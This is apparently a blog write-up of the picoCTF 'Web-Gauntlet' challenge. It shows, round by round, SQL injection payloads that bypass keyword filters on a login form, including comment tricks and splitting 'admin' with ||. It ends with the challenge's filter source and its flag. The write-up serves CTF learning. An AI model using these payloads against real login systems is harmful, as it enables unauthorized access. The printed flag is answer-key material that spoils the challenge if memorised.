---
title: "Web-Gauntlet"
date: "2020-12-22"
author: "RealFakeAccount"
description: "https://play.picoctf.org/practice/challenge/88"
---
Put any username and password and you can see the SQL query.

<http://jupiter.challenges.picoctf.org:19593/filter.php> tells us which words is banned.

*Notes:*

Here is some common way to comment in SQL:
1. #
2. --
3. //
4. /**/
5. ; %00

### Round 1

Here is the filter shown in <http://jupiter.challenges.picoctf.org:19593/filter.php>
```sql
or
```

For the detail of the banned "OR" method, see <https://owasp.org/www-community/attacks/SQL_Injection>

let's use another methods.

We can change the username into `admin' --`, so the original SQL query becomes:

```sql
SELECT * FROM users WHERE username='admin' --' AND password='a'
```

which comments out the password part.

### Round 2

Here is the filter shown in <http://jupiter.challenges.picoctf.org:19593/filter.php>
```sql
or and like = --
```

Use ; to force break the query. 

Our username input is: `admin' ;`

and the SQL query becomes:

```sql
SELECT * FROM users WHERE username='admin' ;' AND password='a'
```

### Round 3


Here is the filter shown in <http://jupiter.challenges.picoctf.org:19593/filter.php>
```sql
   or and = like > < --
```

Note that Space is also in this filter. Use "View page Sourse" to see the space. 

So we can just erase the block in previous round: `admin';`, which gives us

```sql
SELECT * FROM users WHERE username='admin';' AND password='a'
```

### Round 4

They banned the `admin` now. Also, our `;` doess not work in this question.

Here is the filter shown in <http://jupiter.challenges.picoctf.org:19593/filter.php>
```sql
or and = like > < -- admin
```

Luckly, SQL have some function to concatenate string: `CONCAT`, `+`, `||`

After a few trial, we find that `||` worked.

Our payload is: `ad'||'min'/*`

```sql
SELECT * FROM users WHERE username='ad'||'min'/*' AND password='a'
```

### Round 5

Here is the filter shown in <http://jupiter.challenges.picoctf.org:19593/filter.php>
```sql
 or and = like > < -- union admin```
```

Previous one still work.

```sql
SELECT * FROM users WHERE username='ad'||'min'/*' AND password='a'
```

After finish all 5 rounds, we can finally see the filter php file:

```php
 <?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}
?> 
```